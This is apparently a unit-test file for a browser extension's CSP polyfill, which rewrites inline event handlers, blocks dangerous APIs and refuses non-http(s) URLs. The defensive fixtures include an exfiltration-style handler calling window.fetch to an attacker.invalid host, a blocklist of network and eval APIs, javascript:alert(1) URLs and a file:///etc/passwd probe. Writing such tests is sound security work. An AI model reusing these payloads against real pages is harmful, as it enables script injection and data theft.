// Real full CSP IIFE installed on a private Element facade over detached DOM.
// No native page prototype is patched. Its captured listeners run the real interpreter.
// opts.paths: extra real source files loaded AFTER the polyfill in the same scope;
// opts.globals: merged over the default globals (S0C-01 generalisation).
async function cspFixture(opts) {
    opts=opts||{};
    var inert=new DOMParser().parseFromString('<html><body></body></html>','text/html'),cache=new WeakMap(),warnings=[],calls=[],docListeners={};
    function ElementFacade(node){this.node=node||inert.createElement('div');cache.set(this.node,this);}
    function wrap(node){return node?(cache.get(node)||new ElementFacade(node)):null;}
    Object.defineProperties(ElementFacade.prototype,{
        innerHTML:{configurable:true,get:function(){return this.node.innerHTML;},set:function(v){this.node.innerHTML=v;}},
        outerHTML:{configurable:true,get:function(){return this.node.outerHTML;},set:function(v){this.node.outerHTML=v;}},
        attributes:{get:function(){return this.node.attributes;}},
        parentNode:{get:function(){return wrap(this.node.parentNode);}},parentElement:{get:function(){return wrap(this.node.parentElement);}},
        previousSibling:{get:function(){return wrap(this.node.previousSibling);}},nextSibling:{get:function(){return wrap(this.node.nextSibling);}},
        firstChild:{get:function(){return wrap(this.node.firstChild);}},lastChild:{get:function(){return wrap(this.node.lastChild);}},nodeType:{get:function(){return this.node.nodeType;}},
        classList:{get:function(){return this.node.classList;}},tagName:{get:function(){return this.node.tagName;}},
        textContent:{configurable:true,get:function(){return this.node.textContent;},set:function(v){this.node.textContent=v;}},
        value:{configurable:true,get:function(){return this.node.value;},set:function(v){this.node.value=v;}}
    });
    ElementFacade.prototype.contains=function(o){return !!o&&this.node.contains(o.node||o);};
    ElementFacade.prototype.click=function(){this.fire('click',{});};
    ElementFacade.prototype.focus=function(){};ElementFacade.prototype.select=function(){};
    ElementFacade.prototype.querySelectorAll=function(s){return Array.from(this.node.querySelectorAll(s)).map(wrap);};
    // S0C-03: openScreenshotModal/navigateScreenshot/updateNavArrows use querySelector, img dataset/src and nav-button style.
    ElementFacade.prototype.querySelector=function(s){return wrap(this.node.querySelector(s));};
    Object.defineProperties(ElementFacade.prototype,{dataset:{get:function(){return this.node.dataset;}},style:{get:function(){return this.node.style;}},
        src:{configurable:true,get:function(){return this.node.src;},set:function(v){this.node.src=v;}}});
    ElementFacade.prototype.setAttribute=function(n,v){this.node.setAttribute(n,v);};
    ElementFacade.prototype.removeAttribute=function(n){this.node.removeAttribute(n);};
    ElementFacade.prototype.insertAdjacentHTML=function(p,h){this.node.insertAdjacentHTML(p,h);};
    ElementFacade.prototype.addEventListener=function(type,fn){if(!this.listeners)this.listeners={};(this.listeners[type]||(this.listeners[type]=[])).push(fn);};
    ElementFacade.prototype.fire=function(type,event){(this.listeners&&this.listeners[type]||[]).forEach(function(fn){fn.call(this,event||{});},this);};
    var timers=[],w={};w.window=w;w.capture=function(){calls.push({receiver:this,args:Array.from(arguments)});};
    var doc={getElementById:function(id){return wrap(inert.getElementById(id));},querySelector:function(s){return wrap(inert.querySelector(s));},
        addEventListener:function(type,fn){(docListeners[type]||(docListeners[type]=[])).push(fn);}};
    var m=await loadModules(['src/platform/extension/csp-polyfill.js'].concat(opts.paths||[]),{globals:Object.assign({Element:ElementFacade,window:w,document:doc,console:{warn:function(){warnings.push(Array.from(arguments));}},setTimeout:function(fn,ms){timers.push({fn:fn,ms:ms});return timers.length;}},opts.globals||{})});
    // The polyfill resolves handler names via window[name].
    Object.keys(m).forEach(function(k){if(typeof m[k]==='function'&&!(k in w))w[k]=m[k];});
    return {Element:ElementFacade,wrap:wrap,doc:inert,window:w,warnings:warnings,calls:calls,timers:timers,m:m,docListeners:docListeners};
}
describe('CSP polyfill intercepted DOM behavior',function(){
    test('S0C-01 prompt modal OK click and Enter resolve the typed value through the real polyfill _exec',async function(){
        var f=await cspFixture({paths:['src/js/ui/230-modals.js'],globals:{modalResolve:null,escapeHtml:function(s){return String(s).replace(/[&<>"']/g,function(c){return '&#'+c.charCodeAt(0)+';';});}}});
        f.doc.body.innerHTML='<div id="modal-overlay"><div id="modal-header"></div><div id="modal-body"></div><div id="modal-actions"></div></div>';
        var p=f.m.showPromptModal('T','M','d');
        f.wrap(f.doc.getElementById('modal-prompt-input')).value='typed';
        f.wrap(f.doc.querySelector('#modal-actions .modal-btn.primary')).fire('click',{});
        assert.strictEqual(await p,'typed');
        var p2=f.m.showPromptModal('T','M','d'),input2=f.wrap(f.doc.getElementById('modal-prompt-input')),prevented=0;
        input2.value='typed2';
        (f.docListeners.keydown||[]).forEach(function(fn){fn({key:'Enter',target:input2,preventDefault:function(){prevented++;}});});
        assert.strictEqual(await p2,'typed2');
        assert.strictEqual(prevented,1);
        assert.deepStrictEqual(f.warnings,[]);
    },{tags:['unit']});
    test('innerHTML converts and binds inline handler without retaining executable attributes',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'A&amp;B\')">Run</button>';var button=root.querySelectorAll('button')[0];
        assert.strictEqual(button.node.hasAttribute('onclick'),false);assert.strictEqual(button.node.hasAttribute('data-_ev-click'),false);button.fire('click');assert.deepStrictEqual(f.calls[0].args,['A&B']);assert.strictEqual(f.calls[0].receiver,button);assert.deepStrictEqual(f.m.__unstubbed,[]);
    });
    test('outerHTML replacement binds only new sibling span',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'old\')">Old</button><i>Boundary</i>';var old=root.querySelectorAll('button')[0];
        old.outerHTML='<button onclick="capture(\'new\')">New</button><button onclick="capture(\'second\')">Second</button>';
        var buttons=root.querySelectorAll('button');buttons.forEach(function(b){b.fire('click');});assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}),['new','second']);assert.strictEqual(buttons[0].node.hasAttribute('onclick'),false);
    });
    test('insertAdjacentHTML covers inside and outside insertions without duplicate listeners',async function(){
        var f=await cspFixture(),root=new f.Element();root.innerHTML='<button onclick="capture(\'existing\')">E</button>';root.insertAdjacentHTML('beforeend','<button onclick="capture(\'inside\')">I</button>');var first=root.querySelectorAll('button')[0];first.insertAdjacentHTML('afterend','<button onclick="capture(\'outside\')">O</button>');
        root.querySelectorAll('button').forEach(function(b){b.fire('click');});assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}),['existing','outside','inside']);
    });
    test('setAttribute routes handlers through listener and preserves ordinary attributes',async function(){
        var f=await cspFixture(),el=new f.Element();el.setAttribute('title','A&B');el.setAttribute('onclick','capture(this,event,true,false,null,undefined,3.5)');var ev={key:'X'};el.fire('click',ev);
        assert.strictEqual(el.node.getAttribute('title'),'A&B');assert.strictEqual(el.node.hasAttribute('onclick'),false);assert.deepStrictEqual(f.calls[0].args,[el,ev,true,false,null,undefined,3.5]);
    });
    test('quoted commas, semicolons and escape sequences survive interpreter arguments',async function(){
        var f=await cspFixture(),el=new f.Element();el.setAttribute('onclick',String.raw`capture('a,b;c','line\nnext','literal\\n','\x3ctag\x3e\x26\x22')`);el.fire('click');
        assert.deepStrictEqual(f.calls[0].args,['a,b;c','line\nnext','literal\\n','<tag>&"']);
    });
    test('event conditions, propagation controls and element assignment take real branches',async function(){
        var f=await cspFixture(),el=new f.Element(),stopped=0,prevented=0;el.value='old';el.setAttribute('onkeydown',"if(event.key==='Enter'||event.key==='Escape')capture(this.value);event.stopPropagation();event.preventDefault();this.value = ''");
        el.fire('keydown',{key:'Tab',stopPropagation:function(){stopped++;},preventDefault:function(){prevented++;}});assert.strictEqual(f.calls.length,0);assert.strictEqual(el.value,'');
        el.value='new';el.fire('keydown',{key:'Enter',stopPropagation:function(){stopped++;},preventDefault:function(){prevented++;}});assert.deepStrictEqual(f.calls[0].args,['new']);assert.strictEqual(stopped,2);assert.strictEqual(prevented,2);
    });
    test('delayed interpreter executes only when captured timer runs',async function(){var f=await cspFixture(),el=new f.Element();el.setAttribute('onclick',"setTimeout(function(){capture('later')}, 25)");el.fire('click');assert.strictEqual(f.calls.length,0);assert.strictEqual(f.timers[0].ms,25);f.timers[0].fn();assert.deepStrictEqual(f.calls[0].args,['later']);});
    test('direct dangerous APIs and prototype-path calls are blocked before lookup',async function(){
        var f=await cspFixture(),el=new f.Element(),effects=[];['fetch','eval','Function','XMLHttpRequest','WebSocket','Worker','chrome'].forEach(function(name){f.window[name]=function(){effects.push(name);};});
        el.setAttribute('onclick',"fetch('x');eval('x');Function('x');XMLHttpRequest();WebSocket('x');Worker('x');chrome();capture.constructor('x')");el.fire('click');assert.deepStrictEqual(effects,[]);assert.strictEqual(f.calls.length,0);assert.strictEqual(f.warnings.length,8);
    });
    test('unresolved and throwing handlers warn instead of escaping the event listener',async function(){var f=await cspFixture(),el=new f.Element();f.window.boom=function(){throw new Error('fixture failure');};el.setAttribute('onclick','missing();boom()');el.fire('click');assert.strictEqual(f.warnings.length,2);assert.match(f.warnings[0].join(' '),/Function not found: missing/);assert.match(f.warnings[1].join(' '),/Handler error: fixture failure/);});
    test('window-qualified network call must not bypass dangerous API blocklist',async function(){
        var f=await cspFixture(),root=new f.Element(),requests=[];f.window.fetch=function(url){requests.push(url);};
        root.innerHTML='<button onclick="window.fetch(\'https://attacker.invalid/collect\')">Untrusted</button>';root.querySelectorAll('button')[0].fire('click');
        assert.deepStrictEqual(requests,[],'the documented dangerous-API guard must also protect window.fetch');
    });
    test('S0C-02 block if-statements run their body only on a matching key',async function(){
        var f=await cspFixture(),el=new f.Element(),prevented=0;
        el.setAttribute('onkeydown',"if(event.key==='Enter'||event.key===' '){event.preventDefault();capture('row');}");
        ['Enter',' ','a','Escape'].forEach(function(k){el.fire('keydown',{key:k,preventDefault:function(){prevented++;}});});
        assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}),['row','row']);assert.strictEqual(prevented,2);assert.deepStrictEqual(f.warnings,[]);
        // Workspace-pill shape (body.html:101/:271, A1E-01 note): a nested if inside the block. The block body runs on
        // Enter/Space only. The nested !event.repeat guard is outside the _cond grammar (pre-existing trap), so this.click()
        // is not reached here; the static pill is compiled to a real listener by the build (A1E-01 rejected).
        // R2a(3)/(4): the drop is no longer silent: _cond warns on the unsupported term and this.click() is not reached.
        var pill=new f.Element(),pd=0,clicks=0;pill.addEventListener('click',function(){clicks++;});
        pill.setAttribute('onkeydown',"if(event.key==='Enter'||event.key===' '){event.preventDefault();if(!event.repeat)this.click();}");
        ['Enter',' ','a','Escape'].forEach(function(k){pill.fire('keydown',{key:k,repeat:false,preventDefault:function(){pd++;}});});
        assert.strictEqual(pd,2);assert.strictEqual(clicks,0,'this.click() is not reached');
        assert.strictEqual(f.warnings.length,2);f.warnings.forEach(function(w){assert.match(w.join(' '),/Unsupported condition term: !event\.repeat/);});
        f.warnings.length=0;
        // else stays unsupported: no call and one Unmatched warning.
        var alt=new f.Element();alt.setAttribute('onkeydown',"if(event.key==='x'){capture('a')}else{capture('b')}");alt.fire('keydown',{key:'x'});
        assert.strictEqual(f.calls.length,2);assert.strictEqual(f.warnings.length,1);assert.match(f.warnings[0].join(' '),/Unmatched/);
        // A key term with extra logic (&&) is not an exact event.key term either: it warns too.
        f.warnings.length=0;var amp=new f.Element();amp.setAttribute('onkeydown',"if(event.key==='Enter'&&event.shiftKey)capture('amp')");amp.fire('keydown',{key:'a'});
        assert.strictEqual(f.warnings.length,1);assert.match(f.warnings[0].join(' '),/Unsupported condition term: event\.key==='Enter'&&event\.shiftKey/);
    },{tags:['unit']});
    test('S0C2-01 insertAdjacentHTML scans only inserted nodes (all 4 positions + fragment parent)',async function(){
        var f=await cspFixture(),root=new f.Element(),seen=[],qsa=f.Element.prototype.querySelectorAll;
        f.Element.prototype.querySelectorAll=function(s){if(s==='*')seen.push(this);return qsa.call(this,s);};
        root.innerHTML='<button onclick="capture(\'existing\')">E</button>';
        var existing=root.querySelectorAll('button')[0],attr=new f.Element();attr.setAttribute('onclick',"capture('attr')");root.node.appendChild(attr.node);
        [['beforeend',root],['afterbegin',root],['beforebegin',existing],['afterend',existing]].forEach(function(pt){
            var target=pt[1];seen.length=0;
            target.insertAdjacentHTML(pt[0],'<div><button onclick="capture(\''+pt[0]+'\')">'+pt[0]+'</button></div>');
            assert.strictEqual(seen.length,1,pt[0]+' scans one inserted subtree');assert.strictEqual(seen[0].node.parentNode,root.node,pt[0]+' scans the inserted div');assert.strictEqual(seen[0].node.textContent,pt[0]);
            assert.strictEqual(seen.indexOf(root),-1,pt[0]+' never rescans the parent');assert.strictEqual(seen.indexOf(target),-1,pt[0]+' never rescans this');
        });
        root.querySelectorAll('button').forEach(function(b){b.fire('click');});attr.fire('click');
        assert.deepStrictEqual(f.calls.map(function(c){return c.args[0];}).sort(),['afterbegin','afterend','attr','beforebegin','beforeend','existing']);
        var frag=f.doc.createDocumentFragment(),child=f.doc.createElement('span');frag.appendChild(child);
        f.wrap(child).insertAdjacentHTML('afterend','<button onclick="capture(\'frag\')">F</button>');
        f.wrap(frag.querySelector('button')).fire('click');
        assert.strictEqual(f.calls.length,7);assert.strictEqual(f.calls[6].args[0],'frag');assert.deepStrictEqual(f.warnings,[]);
    },{tags:['unit']});
    test('S0C-03 screenshot modal Open URL opens http(s) on the real window with noopener; other schemes render no button',async function(){
        var A='data:image/png;base64,AA',B='data:image/png;base64,BB',url="https://ex.test/a?b='c'",opened=[];
        // escapeJsString: verbatim copy of src/js/tools/120-actions.js:122-131.
        function escapeJsString(s){return String(s==null?'':s).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'\\x22').replace(/</g,'\\x3c').replace(/>/g,'\\x3e').replace(/&/g,'\\x26').replace(/\r?\n/g,'\\n');}
        var f=await cspFixture({paths:['src/js/ui/290-screenshot-ui.js'],globals:{chats:{c:{messages:[{role:'screenshot',base64:A,url:url},{role:'screenshot',base64:B,url:'javascript:alert(1)'}]}},currentChatId:'c',UI_ICONS:{},escapeJsString:escapeJsString,
            escapeHtml:function(s){return String(s).replace(/[&<>\"']/g,function(c){return '&#'+c.charCodeAt(0)+';';});}}});
        // Brand-checking spy: like the native window.open it throws unless its receiver is window.
        f.window.open=function(){if(this!==f.window)throw new TypeError('Illegal invocation');opened.push([].slice.call(arguments));};
        f.doc.body.innerHTML='<div id="modal-overlay"><div id="modal-header"></div><div id="modal-body"></div><div id="modal-actions"></div></div>';
        function urlBtn(){return f.wrap(f.doc.querySelector('#modal-header button[title="Open URL"]'));}
        f.m.openScreenshotModal(A,'T',1,1,url);
        urlBtn().fire('click',{});
        assert.deepStrictEqual(opened,[[url,'_blank','noopener']]);assert.deepStrictEqual(f.warnings,[]);
        f.m.navigateScreenshot(1);
        assert.strictEqual(urlBtn(),null,'javascript: URL renders no Open URL button');assert.strictEqual(f.doc.querySelector('#modal-body img').getAttribute('src'),B);
        f.m.navigateScreenshot(-1);urlBtn().fire('click',{});
        assert.deepStrictEqual(opened,[[url,'_blank','noopener'],[url,'_blank','noopener']]);
        f.m.openScreenshotModal(B,'T',1,1,'javascript:alert(1)');assert.strictEqual(urlBtn(),null);
        f.m.openScreenshotSourceUrl('javascript:alert(1)');f.m.openScreenshotSourceUrl('');
        assert.strictEqual(opened.length,2,'the helper itself refuses non-http(s) URLs');assert.deepStrictEqual(f.warnings,[]);
        // R2c-2: data:, file:, blob: and chrome-extension: render no button (open or navigate) and never reach window.open.
        var shotB=f.m.getScreenshotList()[1];
        ['data:text/html;base64,PGI+','file:///etc/passwd','blob:https://ex.test/0b1e','chrome-extension://abcdefgh/app.html'].forEach(function(u){
            f.m.openScreenshotModal(A,'T',1,1,u);assert.strictEqual(urlBtn(),null,u+': no Open URL button');
            shotB.url=u;f.m.navigateScreenshot(1);assert.strictEqual(urlBtn(),null,u+': no Open URL button after navigate');
            f.m.openScreenshotSourceUrl(u);
        });
        assert.strictEqual(opened.length,2,'data:/file:/blob:/chrome-extension: never reach window.open');
        // URL schemes are case-insensitive: an uppercase HTTPS:// URL renders the button and opens it.
        var UP='HTTPS://EX.TEST/Up';f.m.openScreenshotModal(A,'T',1,1,UP);urlBtn().fire('click',{});
        shotB.url=UP;f.m.navigateScreenshot(1);urlBtn().fire('click',{});
        assert.deepStrictEqual(opened.slice(2),[[UP,'_blank','noopener'],[UP,'_blank','noopener']]);assert.deepStrictEqual(f.warnings,[]);
    },{tags:['unit']});
    test('S0C-03 characterization: dotted native calls in inline handlers stay inert (no polyfill receiver fix)',async function(){
        var f=await cspFixture(),el=new f.Element(),opened=[];
        f.window.open=function(){if(this!==f.window)throw new TypeError('Illegal invocation');opened.push([].slice.call(arguments));};
        el.setAttribute('onclick',"window.open('x')");el.fire('click',{});
        assert.deepStrictEqual(opened,[]);assert.strictEqual(f.warnings.length,1);assert.match(f.warnings[0].join(' '),/Handler error: Illegal invocation/);
    },{tags:['unit']});
});
